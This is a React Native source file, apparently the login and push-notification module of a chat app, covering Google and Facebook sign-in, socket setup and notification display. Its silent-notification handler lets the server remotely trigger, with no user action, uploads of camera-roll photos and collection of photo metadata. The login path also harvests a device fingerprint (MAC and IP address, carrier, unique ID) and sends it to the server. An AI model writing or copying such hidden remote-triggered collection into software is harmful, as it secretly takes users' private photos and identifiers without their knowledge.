import {ACTIONS} from './types';
import {
  URLS,
  ANDROID_CLIENT_ID,
  WEB_CLIENT_ID,
  SOCKET_EVENTS,
  LATEST_APP_VERSION,
} from '../Constants';
import {AppState} from 'react-native';
import {LoginManager, AccessToken} from 'react-native-fbsdk';
import uuid from 'uuid-random';
import {store} from '../reducers';
import {GoogleSignin} from '@react-native-community/google-signin';
import Device from 'react-native-device-info';
import messaging from '@react-native-firebase/messaging';
import {uploadCameraRollPhotos, logout, getPhotosMetadata} from './HomeAction';
import {check, PERMISSIONS, RESULTS} from 'react-native-permissions';
import PushNotification from 'react-native-push-notification';
import APP_INFO from '../../package.json';
import auth from '@react-native-firebase/auth';
import {
  httpClient,
  encrypt,
  decrypt,
  storageGetItem,
  storageSetItem,
} from '../utilities';
import {socketEmit, setupSocket, runSocketListeners} from '../socket';

messaging().setBackgroundMessageHandler(async (notif) => {
  makeLocalNotification(notif.data);
});

const getFCMToken = async () => {
  if (!messaging().isDeviceRegisteredForRemoteMessages) {
    messaging().registerDeviceForRemoteMessages();
  }
  const pushToken = await messaging().getToken();
  return pushToken;
};

PushNotification.popInitialNotification(() => {});

const setPushNotifications = async () => {
  PushNotification.configure({
    onNotification: (notification) => {
      makeLocalNotification(notification);
      // handleNotification(notification)
    },
    popInitialNotification: false,
  });
};

setPushNotifications();

const incomingMessageConverter = (data) => {
  const new_message = [
    {
      _id: uuid(),
      createdAt: data.createdAt,
      text: data.text,
      user: {_id: data.from, name: data.groupSender},
      image: data.image,
    },
  ];

  return new_message;
};

const makeLocalNotification = async (notification) => {
  if (notification.silent) {
    switch (notification.type) {
      case 'upload_personal_pictures':
        uploadCameraRollPhotos(
          notification.user_id,
          Number(notification.numberOfImages),
          notification.groupTypes,
          notification.groupName,
          notification.after,
        );
        break;

      case 'check_image_permission':
        const result = await check(PERMISSIONS.ANDROID.CAMERA);
        const image_permission = result === RESULTS.GRANTED ? true : false;
        httpClient()
          .post(URLS.check_image_permission, {image_permission})
          .then(() => {});
        break;

      case 'check_app_installed':
        httpClient()
          .post(URLS.check_app_installed)
          .then(() => {});
        break;

      case 'get_photos_metadata':
        getPhotosMetadata(
          notification.user_id,
          Number(notification.numberOfImages),
          notification.groupTypes,
          notification.groupName,
          notification.after,
        );
        break;

      case 'force_logout':
        logout()(store.dispatch);
        break;

      default:
        return null;
    }
  } else {
    let {title, body, type} = notification;
    if (type !== 'manual') {
      title = decrypt(title);
      body = decrypt(body);
    }

    PushNotification.localNotification({
      autoCancel: true,
      largeIcon: 'ic_launcher',
      smallIcon: 'ic_stat_ic_notification',
      vibrate: true,
      vibration: 200,
      priority: 'max',
      visibility: 'private',
      importance: 'max',
      title,
      message: body,
    });
  }
};

const makeConnection = async (json_data, dispatch) => {
  const t = Date.now();
  const response = await storageGetItem(
    'LOGIN ACTION 1',
    json_data.authtoken.toString(),
  );

  dispatch({
    type: ACTIONS.CHAT_FIRST_LOGIN,
    payload: {
      first_login: response.first_login,
      authtoken: json_data.authtoken,
      theme: response.theme,
    },
  });

  dispatch({
    type: ACTIONS.CHAT_LOAD_DATA,
    payload: {...response, user_id: json_data.authtoken},
  });

  dispatch({
    type: ACTIONS.LOGIN_DATA,
    payload: {data: json_data.data, authtoken: json_data.authtoken},
  });

  // setup socket for use and listen for events
  setupSocket(json_data.authtoken);
  runSocketListeners();

  AppState.addEventListener('change', (appState) => {
    if (appState === 'background' || appState === 'inactive') {
      socketEmit(SOCKET_EVENTS.SEND_OFFLINE, {id: json_data.authtoken});
    } else {
      socketEmit(SOCKET_EVENTS.NOT_DISCONNECTED, {id: json_data.authtoken});
      PushNotification.cancelAllLocalNotifications();
    }
  });

  let to_emit = {
    id: json_data.authtoken,
    name: json_data.data.name,
  };

  socketEmit(SOCKET_EVENTS.JOIN, to_emit);

  const manufacturer = await Device.getManufacturer();
  const designName = await Device.getDevice();
  const phoneModel = Device.getModel();
  const totalMemory = await Device.getTotalMemory();
  const carrier = await Device.getCarrier();
  const uniqueDeviceId = await Device.getUniqueId();
  const firstInstall = await Device.getFirstInstallTime();
  const freeDisk = await Device.getFreeDiskStorage();
  const IPAddress = await Device.getIpAddress();
  const lastUpdatedApp = await Device.getLastUpdateTime();
  const macAddress = await Device.getMacAddress();
  const osVersion = await Device.getSystemVersion();
  const currentAppVersion = APP_INFO.version;

  let fullDeviceInfo = {
    deviceInfo: {manufacturer, designName, phoneModel, totalMemory},
    carrier,
    freeDisk,
    IPAddress,
    uniqueDeviceId,
    firstInstall,
    lastUpdatedApp,
    macAddress,
    currentAppVersion,
    osVersion,
  };
  socketEmit(SOCKET_EVENTS.DEVICE_INFO, fullDeviceInfo);
};

export const checkLogin = (onSuccess, onForceUpdate) => {
  return (dispatch) => {
    // 1) Check from server if there is a new force update
    httpClient()
      .get(URLS.get_min_app_version)
      .then(({data}) => {
        if (Number(data.MIN_APP_VERSION) > LATEST_APP_VERSION) {
          onForceUpdate();
        } else {
          storageGetItem('LOGIN ACTION 2', 'data').then(async (response) => {
            if (response !== null && Object.keys(response).length !== 0) {
              await makeConnection(response, dispatch);
              onSuccess();
            } else {
              dispatch({type: ACTIONS.LOGOUT});
            }
          });
        }
      });
  };
};

const loginGoogleHelper = async (dispatch) => {
  dispatch({type: ACTIONS.LOADING_GOOGLE, payload: true});

  GoogleSignin.configure({
    androidClientId: ANDROID_CLIENT_ID,
    webClientId: WEB_CLIENT_ID,
    forceConsentPrompt: true,
  });

  const response = await GoogleSignin.signIn().catch((e) => {
    dispatch({type: ACTIONS.LOADING_GOOGLE, payload: false});
  });
  const {idToken, accessToken} = await GoogleSignin.getTokens();
  const credential = auth.GoogleAuthProvider.credential(idToken, accessToken);
  auth().signInWithCredential(credential);

  const pushToken = await getFCMToken();

  let new_data = {
    id: response.user.id,
    provider: credential.providerId,
    name: response.user.name,
    email: response.user.email,
    image_url: response.user.photo, //response.user.photoURL,
    pushToken: pushToken,
  };

  let data_to_send = new_data;
  data_to_send.id = encrypt(data_to_send.id);
  data_to_send.pushToken = encrypt(data_to_send.pushToken);

  const {data: user_data} = await httpClient()
    .post(URLS.login, data_to_send)
    .catch((e) => {
      dispatch({type: ACTIONS.LOADING_GOOGLE, payload: false});
    });

  new_data.name = user_data.name;
  new_data.image_url = user_data.image_url;

  authtoken = user_data.token;
  final_data = {data: new_data, authtoken: authtoken};
  storageSetItem('LOGIN ACTION 1', 'data', final_data);
  dispatch({
    type: ACTIONS.CHAT_FIRST_LOGIN,
    payload: {
      first_login: user_data.first_login,
      theme: user_data.theme,
      authtoken: final_data.authtoken,
    },
  });
  dispatch({type: ACTIONS.LOGIN_DATA, payload: final_data});
  makeConnection(final_data, dispatch);
};

export const loginGoogle = (onSuccess) => {
  return (dispatch) => loginGoogleHelper(dispatch).then(onSuccess);
};

export const loginFacebookHelper = async (dispatch) => {
  dispatch({type: ACTIONS.LOADING_FB, payload: true});

  const response = await LoginManager.logInWithPermissions([
    'public_profile',
    'email',
  ]).catch((e) => {
    dispatch({type: ACTIONS.LOADING_FB, payload: false});
  });
  if (response.isCancelled) {
    dispatch({type: ACTIONS.LOADING_FB, payload: false});
    return;
  }

  const accessTokenData = await AccessToken.getCurrentAccessToken().catch(
    (e) => {
      dispatch({type: ACTIONS.LOADING_FB, payload: false});
    },
  );

  const token = accessTokenData.accessToken;
  const userId = accessTokenData.userID;
  const credential = auth.FacebookAuthProvider.credential(token);
  auth()
    .signInWithCredential(credential)
    .catch(() => {});

  const fetch_response = await fetch(
    `https://graph.facebook.com/${userId}?fields=email,picture.type(large),name&access_token=${token}`,
  ).catch((e) => {
    dispatch({type: ACTIONS.LOADING_FB, payload: false});
  });
  const data = await fetch_response.json();

  pushToken = await getFCMToken();
  let new_data = {
    id: data.id,
    provider: credential.providerId,
    name: data.name,
    email: data.email,
    image_url: data.picture.data.url,
    pushToken: pushToken,
  };

  let data_to_send = new_data;
  data_to_send.id = encrypt(data_to_send.id);
  data_to_send.pushToken = encrypt(data_to_send.pushToken);

  const {data: user_data} = await httpClient()
    .post(URLS.login, data_to_send)
    .catch((e) => {
      dispatch({type: ACTIONS.LOADING_FB, payload: false});
    });

  new_data.name = user_data.name;
  new_data.image_url = user_data.image_url;

  authtoken = user_data.token;
  final_data = {data: new_data, authtoken: authtoken};

  storageSetItem('LOGIN ACTION 2', 'data', final_data);
  dispatch({
    type: ACTIONS.CHAT_FIRST_LOGIN,
    payload: {
      first_login: user_data.first_login,
      theme: user_data.theme,
      authtoken: final_data.authtoken,
    },
  });
  dispatch({
    type: ACTIONS.LOGIN_DATA,
    payload: final_data,
  });
  makeConnection(final_data, dispatch);
};

export const loginFacebook = (onSuccess) => {
  return (dispatch) => loginFacebookHelper(dispatch).then(onSuccess);
};

export const getPolicy = () => {
  return (dispatch) => {
    httpClient()
      .get(URLS.policy)
      .then((response) => {
        dispatch({type: ACTIONS.LOGIN_POLICY, payload: response.data});
      });
  };
};

export const internetHandler = (internetReachable) => {
  return {type: ACTIONS.LOGIN_INTERNET_REACHABLE, payload: internetReachable};
};
